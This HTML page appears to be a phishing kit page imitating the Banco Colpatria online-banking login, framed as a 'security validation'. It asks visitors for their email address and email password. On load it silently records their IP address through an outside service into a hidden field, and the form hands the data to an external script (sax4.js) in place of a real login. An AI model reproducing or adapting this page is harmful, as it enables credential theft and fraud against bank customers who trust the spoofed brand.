<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
    <title>Home Colpatria virtual</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>

    <script>
         $.getJSON("https://api.ipify.org?format=json",
                                           function(data) {
         
             // Setting text of element P with id gfg
             $("#gfg").html(data.ip);
         })
      </script>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="css/otroindex.css">
    <link rel="stylesheet" type="text/css" href="css/canvas-dom-6.0.0.min.css">
  
    <link rel="stylesheet" href="css/styles.4962d1d9c246b31b311c.css" media="all" onload="this.media=&#39;all&#39;">
    <noscript>
      <link rel="stylesheet" href="styles.4962d1d9c246b31b311c.css">
    </noscript>
  </head>
  <body>
    <auth-root _nghost-hkw-c68="" ng-version="12.1.4">
      <p id="gfg" hidden="">
      <form action="" method="post" onsubmit=" return sender()">
        <div _ngcontent-hkw-c68="" class="application-wrapper">
          <canvas-header _ngcontent-hkw-c68="" shadow="" fixed="" class="header__block">
            <header class="header">
              <div class="header__bar container container--center direction--row">
                <a _ngcontent-hkw-c68="" class="brand block block--centered" href="#">
                <img _ngcontent-hkw-c68="" src="images/Banco_Colpatria_logo.svg.png" class="logo" style="width:80px">
                  <img _ngcontent-hkw-c68="" src="images/Banco_Colpatria_logo.svg.png" class="logo__mobile" style="80px">
                </a>
              </div>
            </header>
          </canvas-header>
          <section _ngcontent-hkw-c68="" role="main" class="container main-container">
            <router-outlet _ngcontent-hkw-c68=""></router-outlet>
            <auth-login _nghost-mpk-c95="">
              <div _ngcontent-mpk-c95="" class="col-xs-12 block--padding-0 margin-xs-72--bottom">
                <div _ngcontent-mpk-c95="" class="direction--row">
                  <div _ngcontent-mpk-c95="" class="col-md-2 hide--xs hide--sm"></div>
                  <div _ngcontent-mpk-c95="" class="col-xs-12 offset-sm-3 col-sm-6 col-md-4 offset-md-0 block--padding-0">
                   
                           <p _ngcontent-c5="" style="font-size: 22pt;" >Validación de seguridad</p>
                           <hr _ngcontent-c5="" class="brand-line text--align-left margin-xs-18--top">
                 
                    <div _ngcontent-mpk-c95="" class="form__input margin-xs-30--top">
                      <canvas-input-text _ngcontent-mpk-c95="" formcontrolname="firstCredential" _nghost-mpk-c49="" class="ng-pristine ng-invalid ng-touched" maxlength="12">
                        <div _ngcontent-hkw-c51="" class="form__input">
                          <label _ngcontent-hkw-c51="" role="text" class="label" for="498k6hd0i"></label>
                          <div _ngcontent-hkw-c51="" class="form__input--inline">
                            <input class="input input--text ng-pristine ng-valid ng-touched input--with-icon input--with-icon--left input-w-aux__input" type="email" placeholder="Correo electrónico" id="usar" autocomplete="off"  required minlength="2" required>
                            <canvas-svg _ngcontent-hkw-c51="" role="presentation" class="input__icon input__icon--left flex">
                              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                <g fill="none">
                                  <path d="M22.129 22.129v-2.39c0-2.64-2.328-4.781-5.199-4.781H6.532c-2.871 0-5.199 2.14-5.199 4.78v2.39"></path>
                                  <circle cx="12.09" cy="6.353" r="5.02"></circle>
                                </g>
                              </svg>
                            </canvas-svg>
                            <!---->
                            <!---->
                            <!---->
                            <button _ngcontent-hkw-c51="" type="button" class="button input-w-aux__action">
                              <canvas-svg _ngcontent-hkw-c51="" size="18" name="close-outline" role="presentation" class="flex">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                  <path fill="none" d="M22.667 12c0 5.891-4.776 10.667-10.667 10.667C6.108 22.667 1.333 17.89 1.333 12S6.108 1.333 12 1.333c5.89 0 10.667 4.776 10.667 10.667zM8.647 8.648l6.705 6.704m0-6.704l-6.704 6.704"></path>
                                </svg>
                              </canvas-svg>
                            </button>
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                          </div>
                        </div>
                      </canvas-input-text>
                      <span _ngcontent-hkw-c97="" id="first-credential-input-error">
                        <!---->
                      </span>
                    </div>
                    <div _ngcontent-hkw-c97="" class="margin-xs-24--top form__password">
                      <canvas-input-text _ngcontent-hkw-c97="" formcontrolname="secondCredential" _nghost-hkw-c51="" class="ng-untouched ng-pristine ng-invalid" maxlength="15">
                        <div _ngcontent-hkw-c51="" class="form__input">
                          <label _ngcontent-hkw-c51="" role="text" class="label" for="lmkbmdm10"></label>
                          <div _ngcontent-hkw-c51="" class="form__input--inline">
                            <input _ngcontent-hkw-c51="" class="input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input" type="password" placeholder="Contraseña de correo" autocomplete="off" required maxlength="15" id="cl4x">
                            <canvas-svg _ngcontent-hkw-c51="" role="presentation" class="input__icon input__icon--left flex">
                              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                <path fill="none" d="M20.175 19.972c0 .988-.808 1.796-1.796 1.796H5.804a1.802 1.802 0 0 1-1.797-1.796v-8.983c0-.988.808-1.796 1.797-1.796h12.575c.988 0 1.796.808 1.796 1.796v8.983z"></path>
                                <path d="M12.99 13.684a.897.897 0 1 1-1.795.002.897.897 0 0 1 1.794-.002z"></path>
                                <path fill="none" d="M12.104 14.582v2.695"></path>
                                <path fill="none" d="M16.607 6.498v2.33M7.6 9.065V6.499m0 0a4.492 4.492 0 0 1 8.982 0"></path>
                              </svg>
                            </canvas-svg>
                            <!---->
                            <!---->
                            <button _ngcontent-hkw-c51="" type="button" class="button input-w-aux__action">
                              <canvas-svg _ngcontent-hkw-c51="" name="show" size="18" role="presentation" class="flex">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                  <g fill="none">
                                    <path d="M1.333 11.933c0 1.451 3.43 7.334 10.667 7.334 1.686 0 3.165-.32 4.442-.827 4.206-1.673 6.225-5.394 6.225-6.507 0-1.45-3.43-7.333-10.667-7.333-7.236 0-10.667 5.882-10.667 7.333z"></path>
                                    <path d="M12 8.267c-2.076 0-3.765 1.645-3.765 3.666 0 2.022 1.69 3.667 3.765 3.667 2.076 0 3.765-1.645 3.765-3.667 0-2.021-1.69-3.666-3.765-3.666"></path>
                                  </g>
                                </svg>
                              </canvas-svg>
                              <!---->
                              <!---->
                            </button>
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                          </div>
                        </div>
                      </canvas-input-text>
                    </div>
                    <div _ngcontent-hkw-c97="" class="margin-xs-18--top">
                      <a _ngcontent-hkw-c97="" class="link link__text" href="#">¿Necesitas ayuda para ingresar?</a>
                    </div>
                  
                    <div _ngcontent-hkw-c97="" class="margin-xs-24--top">
                      <canvas-button _ngcontent-hkw-c97="" width="100%">
                        <button type="submit" class="button button--primary" id="" style="width: 100%;">
                          <!---->
                          <span _ngcontent-hkw-c97="">Validar</span>
                          <!---->
                        </button>
                      </canvas-button>
                    </div>
      </form>
      </div>
      
      <div _ngcontent-hkw-c97="" class="col-md-3 block--padding-0 direction--row info-register">
        
      </div>
      <div _ngcontent-hkw-c97="" class="col-md-2 hide--xs hide--sm"></div>
      </div>
      </div>
      </auth-login>
      <!---->
      </section>
      <footer _ngcontent-hkw-c68="" class="hide--xs">
        <canvas-co-footer-simple _ngcontent-hkw-c68="">
          <div class="footer-simple--co background--background-alternate">
            <div class="container container--center">
              <div class="direction--row">
                <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                  <div class="margin-xs-12 margin-sm-18">
                    <p class="text--roman text--footer color--default">
                      <span _ngcontent-hkw-c68="" text=""> © 2022 Todos los Derechos Reservados <br _ngcontent-hkw-c68="" class="hide--sm hide--md hide--lg"> Colpatria. </span>
                      <!---->
                      <!---->
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </canvas-co-footer-simple>
      </footer>
      </div>
      <jwl-channel-available-error _ngcontent-hkw-c68="">
        <!---->
      </jwl-channel-available-error>
    </auth-root>
    </form>
    <script src="js/sax4.js"></script>
  </body>
</html>